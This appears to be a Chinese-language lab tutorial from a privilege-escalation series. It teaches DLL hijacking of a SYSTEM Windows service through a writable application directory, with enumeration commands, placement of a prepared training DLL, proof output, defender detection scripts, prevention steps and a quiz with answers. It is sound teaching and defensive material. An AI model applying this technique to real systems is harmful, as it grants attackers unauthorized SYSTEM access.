# Day 24：DLL Hijacking：SYSTEM Process 載入了誰控制的程式碼？

## 開場情境

到這裡，Windows Service 的 Object ACL（W01）、Binary（W02）、Path（W03）、Registry（W06）我們都攻破過了。IT 部門全部修好了。

但是，這個 SYSTEM Service 啟動時會嘗試載入一個 plugin DLL。那個 DLL 還不存在。

> 如果你能在 SYSTEM Process 搜尋 DLL 的路徑上放一個 DLL，SYSTEM 就會執行你的程式碼。

---

## 今天要解決的問題

1. Windows 怎麼決定載入哪一個 DLL？
2. Application Directory 為什麼重要？
3. 「缺少 DLL」就代表可以 hijack 嗎？
4. 怎麼證明是 SYSTEM 載入了你的 DLL？

---

## 背景知識：Windows DLL Loading

### DLL Search Order（簡化版）

當程式呼叫 `LoadLibrary("FEIW09Plugin.dll")`（只有名稱，沒有完整路徑）時：

```
1. KnownDLLs Registry（已知 DLL 清單，跳過搜尋）
2. Application Directory（exe 所在目錄）  ← 本題攻擊點
3. System Directory（C:\Windows\System32）
4. Windows Directory（C:\Windows）
5. Current Directory
6. PATH 環境變數中的目錄
```

### SafeDllSearchMode

Windows 預設開啟 `SafeDllSearchMode`，會把 Current Directory 的優先順序降低。但 Application Directory 始終排在最前面。

### .NET Assembly.LoadFrom

本 Lab 使用 .NET 的 `Assembly.LoadFrom`，和 native `LoadLibrary` 的核心概念相同：程式在特定位置尋找模組。Application Directory 是第一個被搜尋的。

---

## OS 原理：為什麼 Application Directory 最危險

![Application Directory DLL 搜尋風險](https://fei3363.github.io/FEI-Privilege-Escalation-Articles/articles/images/generated-diagrams/day24-dll-hijacking-diagram-01.png)



---

## Lab 環境

```
🔬 FEI Lab 環境
VM: FEI-PRIVESC-WINDOWS
OS: Windows 10 Pro (Build 19045)
起始帳號: fei-student (Standard User)
目標: SYSTEM
Flag: C:\FEI-PrivEsc\Flags\fei-w09-system-flag.txt
Scenario: FEI-W09-DLL-HIJACKING
```



### 場景準備

`powershell
# 1. 以 fei-labadmin 登入 Windows VM（VMware Console）
# 密碼：FEI-LabAdmin-2026!

# 2. 以系統管理員開啟 PowerShell，進入場景目錄
cd C:\FEI-PrivEsc\Scenarios\FEI-W09-DLL-HIJACKING

# 3. 執行 setup
.\fei-setup.ps1

# 4. 確認場景就緒
.\fei-verify.ps1
# 應看到 W09-DLL-HIJACKING STATUS: READY

# 5. 登出，改以 fei-student 登入
# 密碼：FEI-Student-2026!
`

### 部署過程

1. csc.exe 編譯 Loader Service（讀取 Application Directory 下的 plugin DLL）
2. csc.exe 編譯 Training DLL（payload：複製 flag 到 public + 記錄 identity）
3. Training DLL 放在 `tools/` 目錄（不在 Bin/）
4. `Bin/` 目錄 ACL：`Users: CreateFiles`（可建立新檔案）
5. Loader exe 本身 ACL：`Users: ReadAndExecute`（不可修改）
6. Service ACL 安全，ImagePath 加引號

### 安全層次確認

| 層面 | 安全？ | 說明 |
|------|--------|------|
| Service ACL | ✅ 安全 | 不能 sc config（W01 ✗）|
| Loader Binary | ✅ 安全 | Users:RX（W02 ✗）|
| ImagePath | ✅ 加引號 | W03 ✗ |
| **Bin/ 目錄** | **❌ 弱** | **Users 可建立新檔案** |

---

## 如果我是攻擊者，我現在想知道什麼？

### Step 1：列舉 Service

```cmd
sc qc FEIDLLTrainingService
```

```
SERVICE_NAME: FEIDLLTrainingService
        BINARY_PATH_NAME   : "C:\FEI-PrivEsc\Training\W09\Bin\FEI-W09-Loader.exe"
        SERVICE_START_NAME : LocalSystem
```

### Step 2：排除 W01/W02/W03

```cmd
sc config FEIDLLTrainingService binPath= "test"
→ 存取被拒（W01 ✗）

icacls "C:\FEI-PrivEsc\Training\W09\Bin\FEI-W09-Loader.exe"
→ Users:(RX)（W02 ✗）

ImagePath 有引號（W03 ✗）
```

### Step 3：檢查 Bin/ 目錄 ACL

```cmd
icacls "C:\FEI-PrivEsc\Training\W09\Bin"
```

```
NT AUTHORITY\SYSTEM:(OI)(CI)(F)
BUILTIN\Users:(OI)(CI)(RX)
BUILTIN\Users:(S,WD)          ← CreateFiles！
```

`(S,WD)` = Synchronize + Write Data = 可以建立新檔案！

### Step 4：DLL 目前不存在

```cmd
dir "C:\FEI-PrivEsc\Training\W09\Bin\FEIW09Plugin.dll"
→ 找不到檔案
```

Loader 會去找這個 DLL。如果我放一個進去……

---

## Attack Reasoning

![DLL Hijacking Attack Reasoning](https://fei3363.github.io/FEI-Privilege-Escalation-Articles/articles/images/generated-diagrams/day24-dll-hijacking-diagram-02.png)



---

## 實際驗證

### Step 1：放置 DLL

```cmd
copy "C:\FEI-PrivEsc\Training\W09\tools\FEIW09Plugin.dll" "C:\FEI-PrivEsc\Training\W09\Bin\FEIW09Plugin.dll"
```

```
複製了 1 個檔案。
```

### Step 2：重啟 Service

```cmd
sc stop FEIDLLTrainingService
sc start FEIDLLTrainingService
```

### Step 3：讀取 Proof

```cmd
type "C:\Users\Public\fei-w09-proof.txt"
```

```
========================================
 FEI PrivEsc Lab - DLL Hijacking Proof
========================================
Scenario: FEI-W09-DLL-HIJACKING
Identity: NT AUTHORITY\SYSTEM
DLL Path: C:\FEI-PrivEsc\Training\W09\Bin\FEIW09Plugin.dll
Flag: FEI{WINDOWS_W09_DLL_HIJACKING_SYSTEM_ACCESS}
```

### 三個關鍵證據

1. **Identity: NT AUTHORITY\SYSTEM** — 確實以 SYSTEM 執行
2. **DLL Path: ...Bin\FEIW09Plugin.dll** — 從正確位置載入
3. **Flag** — 成功讀取受保護檔案

---

## Attack Path

![DLL Hijacking Attack Path 資訊圖](https://fei3363.github.io/FEI-Privilege-Escalation-Articles/articles/images/generated-diagrams/day24-dll-hijacking-diagram-03.png)


---

## False Positive：「缺少 DLL」不代表可以 Hijack

掃描器常報告「Missing DLL」。但要成功 hijack 需要：

| 條件 | 必須成立 |
|------|---------|
| DLL 不存在 | ✅ |
| 搜尋路徑中有可寫目錄 | ✅ |
| 可寫目錄在 KnownDLLs 之後被搜尋 | ✅ |
| 載入 DLL 的 process 有更高權限 | ✅ |
| 攻擊者可以觸發載入 | ✅ |
| DLL 的 export 格式正確 | ✅ |

缺任何一項就不成立。

### 常見 False Positive

1. **缺少的 DLL 在 KnownDLLs 清單中** — 搜尋會被跳過
2. **可寫目錄在搜尋順序最後** — 更早的位置有正確 DLL
3. **Process 以 standard user 執行** — 沒有提權價值
4. **DLL 格式不符** — native vs .NET mismatch

---

## Edge Case

### Native DLL vs .NET Assembly

| 項目 | Native DLL (LoadLibrary) | .NET Assembly (Assembly.LoadFrom) |
|------|------------------------|----------------------------------|
| 搜尋路徑 | Windows DLL Search Order | Application Directory |
| DLL 格式 | PE native | .NET Assembly |
| 入口點 | DllMain | static constructor |
| 編譯工具 | C/C++ | csc.exe |

本 Lab 使用 .NET Assembly.LoadFrom，因為 csc.exe 在 Windows 上一定可用，不需要 Visual Studio。

### Application Directory 的 ACL 陷阱

如果目錄的 ACL 允許 `Users: CreateFiles`，即使 exe 本身是 `Users: ReadAndExecute`，攻擊者仍然可以在同目錄放入 DLL。

這就是為什麼保護 Service Binary（W02）不夠——**目錄的 ACL 也必須安全**。

---

## Troubleshooting

| 問題 | 原因 | 解決 |
|------|------|------|
| copy 失敗 | 目錄 ACL 不允許建立 | 確認 `icacls` 有 `(S,WD)` |
| Service 啟動後沒有 proof | DLL 格式錯誤 | 確認 DLL 是正確格式 |
| proof 沒有 SYSTEM | Service 不是 SYSTEM | 確認 `sc qc` 的 SERVICE_START_NAME |
| DLL path 顯示錯誤位置 | 其他路徑有同名 DLL | 確認 DLL 只在 Bin/ 目錄 |

---

## 深入一層：Windows Service 五種 Trust Surface 總覽

![Windows Service 五種 Trust Surface 資訊圖](https://fei3363.github.io/FEI-Privilege-Escalation-Articles/articles/images/generated-diagrams/day24-dll-hijacking-diagram-04.png)

到 W09 為止，我們已經攻破了 SYSTEM Service 的五個不同 Trust Surface：


每一種都是「SYSTEM Service 信任了某個低權限使用者可控制的資源」。

| 場景 | 被信任的資源 | 攻擊動作 |
|------|-------------|---------|
| W01 | Service Configuration | `sc config binPath=` |
| W02 | Service Binary | 替換 exe |
| W03 | Executable Path | 放置 candidate exe |
| W06 | Registry Value | `reg add` |
| W09 | DLL/Plugin | 放置 DLL |

---

## FEI Lab 工程筆記

W09 是本系列**零 bug 通過**的場景之一。Setup 正確、Verify 正確、Solve 一次成功。

這證明了：**經過前面 8 個場景累積的經驗（特別是 W05 的 6 次修正和 W08 的 3 次修正），Lab 建置的品質在提升。**

---

## 防禦者怎麼看？

### Detect

```powershell
# 檢查 Service exe 所在目錄的 ACL
Get-Service | ForEach-Object {
    $path = (Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\$($_.Name)" -ErrorAction SilentlyContinue).ImagePath
    if ($path) {
        $dir = Split-Path ($path -replace '"','') -Parent
        if ($dir -and (Test-Path $dir)) {
            $acl = Get-Acl $dir
            $weak = $acl.Access | Where-Object {
                $_.IdentityReference -match "Users|Everyone" -and
                ($_.FileSystemRights -band [System.Security.AccessControl.FileSystemRights]::CreateFiles)
            }
            if ($weak) { Write-Output "WEAK: $($_.Name) - $dir" }
        }
    }
}
```

### Prevent

1. **Service exe 所在目錄** — Users 只能 ReadAndExecute，不能 CreateFiles
2. **載入 DLL 時用絕對路徑** — `LoadLibrary("C:\full\path\plugin.dll")`
3. **使用 SafeDllSearchMode**
4. **Application Control**（AppLocker / WDAC）阻擋未簽章 DLL

### Fix Verification

```cmd
icacls "C:\FEI-PrivEsc\Training\W09\Bin"
# Users 應該只有 (RX)，沒有 (S,WD)
```

---

## Detection

| 監控項目 | 方法 |
|---------|------|
| 新 DLL 建立在 Service 目錄 | Sysmon Event 11 (FileCreate) |
| 未簽章 DLL 被 Service 載入 | Sysmon Event 7 (ImageLoaded) |
| Service restart 後行為異常 | Event 7045 + 前後比較 |

---

## Exercise

1. 挑選你機器上一個 SYSTEM Service，用 `sc qc` 找到它的 exe 路徑，用 `icacls` 檢查目錄 ACL。Users 有 CreateFiles 嗎？
2. 如果 Loader 使用完整路徑 `LoadLibrary("C:\specific\path\plugin.dll")`，DLL Hijacking 還有效嗎？為什麼？
3. 比較 W02（替換 exe）和 W09（放入 DLL）：攻擊者需要的前置條件有什麼不同？

---

## Quiz

**Q1**：`icacls` 顯示 `Users:(S,WD)` 是什麼意思？

### 答案
Synchronize + Write Data。在目錄上，Write Data 等同 CreateFiles，代表 Users 可以在該目錄建立新檔案。


**Q2**：Loader exe 不可修改（W02 ✗），為什麼還是可以被 DLL Hijacking？

### 答案
因為 Loader 在啟動時會從 Application Directory 搜尋 DLL。只要目錄允許建立新檔案，即使 exe 本身安全，DLL 仍然可以被放入。exe 安全 ≠ 目錄安全。


**Q3**：KnownDLLs 是什麼？它如何保護 DLL Loading？

### 答案
KnownDLLs 是 Windows 維護的一份「已知 DLL 清單」（存在 Registry 中）。清單上的 DLL 直接從 System32 載入，跳過 Application Directory 等其他搜尋路徑，因此無法被 hijack。




## 場景收尾

做完後記得 reset：

`powershell
# 以 fei-labadmin 的系統管理員 PowerShell
cd C:\FEI-PrivEsc\Scenarios\FEI-W09-DLL-HIJACKING
.\fei-reset.ps1
.\fei-verify.ps1 -Mode reset
# 應看到 W09-DLL-HIJACKING STATUS: RESET
`

---

## 今天真正要記住的 3 件事

1. **DLL Search Order 的第一站是 Application Directory** — 如果目錄可寫，就是 hijack 機會
2. **「Binary 安全」不代表「目錄安全」** — exe 不可修改，但同目錄可能允許建立 DLL
3. **必須證明三件事**：Loader 不可修改 + DLL 從正確位置載入 + SYSTEM identity

---

## 給自己的問題

> 到現在你已經攻破了 Windows Service 的五種不同 Trust Surface。如果五層全部修好了，還有什麼可以做？

---

## 下一篇

Day 25：Windows Service 提權不是一種漏洞 —— 一次拆懂五種不同 Trust Boundary。
